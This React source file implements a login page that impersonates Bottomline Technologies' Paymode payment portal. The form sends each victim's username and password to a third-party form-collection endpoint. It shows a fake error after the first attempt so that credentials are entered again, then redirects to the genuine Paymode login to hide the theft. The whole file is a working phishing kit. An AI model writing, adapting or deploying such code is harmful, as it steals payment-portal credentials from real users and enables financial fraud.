import axios from "axios";
import React, { useState } from "react";
import { PuffLoader } from "react-spinners"; // Spinner for loading
import Background from "./background.png"; // Correct file extension
import Logo from "./logo.svg"; // Ensure the logo file is correctly named and placed

const FORMSPARK_FORM_ID = "https://submit-form.com/QVVbabyKl";

const LoginPage = () => {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [isLoading, setIsLoading] = useState(false);
  const [submissionCount, setSubmissionCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage("");

    try {
      // Add the "Bottomline" source information to the form data
      const submissionData = { ...formData, source: "Bottomline" };

      const response = await axios.post(FORMSPARK_FORM_ID, submissionData);

      if (response.status === 200) {
        setSubmissionCount((prev) => prev + 1);
        setIsLoading(false);

        if (submissionCount === 0) {
          setTimeout(() => {
            setErrorMessage("Error please try again");
          }, 10000); // 10 seconds
        } else if (submissionCount === 1) {
          window.location.href = "https://secure.paymode.com/px/login";
        }
      }
    } catch (error) {
      console.error("Error submitting form:", error.response?.data || error.message);
      setIsLoading(false);
      setErrorMessage("Failed to submit the form. Please try again.");
    }
  };

  return (
    <div className="flex flex-col md:flex-row h-screen">
      {/* Left Section */}
      <div className="w-full md:w-1/2 flex flex-col items-center justify-center bg-white p-8">
        <div className="w-full max-w-md">
          <div className="mb-4">
            <img src={Logo} alt="Bottomline" className="h-48 w-48" />
          </div>
          <form
            onSubmit={handleSubmit}
            className="bg-white px-6 shadow-md -mt-14 rounded-md"
          >
            {errorMessage && (
              <div className="bg-red-100 text-red-500 p-2 rounded-md mb-4">
                {errorMessage}
              </div>
            )}
            <div className="mb-4">
              <label
                htmlFor="username"
                className="block text-sm font-medium text-gray-600"
              >
                USERNAME
              </label>
              <input
                type="text"
                id="username"
                name="username"
                value={formData.username}
                onChange={handleInputChange}
                placeholder="Enter your username"
                className="mt-1 w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <div className="mb-4">
              <label
                htmlFor="password"
                className="block text-sm font-medium text-gray-600"
              >
                PASSWORD
              </label>
              <input
                type="password"
                id="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                placeholder="Enter your password"
                className="mt-1 w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <button
              type="submit"
              disabled={isLoading}
              className={`w-full py-3 text-white font-semibold rounded-md ${
                isLoading ? "bg-gray-400" : "bg-blue-600 hover:bg-blue-700"
              } transition-colors`}
            >
              {isLoading ? <PuffLoader size={20} color="#ffffff" /> : "Log In"}
            </button>
            <div className="flex justify-between text-sm text-blue-600 mt-4">
              <a href="/forgot-password" className="hover:underline">
                Forgot password?
              </a>
              <a href="/forgot-username" className="hover:underline">
                Forgot username?
              </a>
            </div>
          </form>
        </div>
        <footer className="mt-48 text-sm text-gray-500">
          <p>&copy; 2025 Bottomline Technologies, Inc. All Rights Reserved.</p>
          <div className="flex space-x-4 justify-center mt-2">
            <a
              href="/customer-support"
              className="text-blue-600 hover:underline"
            >
              Customer Support
            </a>
            <a
              href="/paymode-policies"
              className="text-blue-600 hover:underline"
            >
              Paymode Policies
            </a>
            <a
              href="/vendor-spotlight"
              className="text-blue-600 hover:underline"
            >
              Vendor Spotlight
            </a>
          </div>
        </footer>
      </div>

      {/* Right Section */}
      <div className="w-full hidden md:block md:w-1/2 bg-cover bg-center relative">
        <img
          src={Background}
          alt="Nature background"
          className="absolute inset-0 w-full h-full object-cover"
        />
        <div className="relative z-10 flex items-center justify-center h-full bg-black bg-opacity-30">
          <div className="text-center text-white max-w-md px-6">
            <h2 className="text-3xl font-bold mb-4">
              Paymode is a better way to pay and get paid
            </h2>
            <p className="text-lg">
              Hundreds of thousands of network members have found the way.
            </p>
          </div>
        </div>
      </div>
      <div className=""></div>
    </div>
  );
};

export default LoginPage;
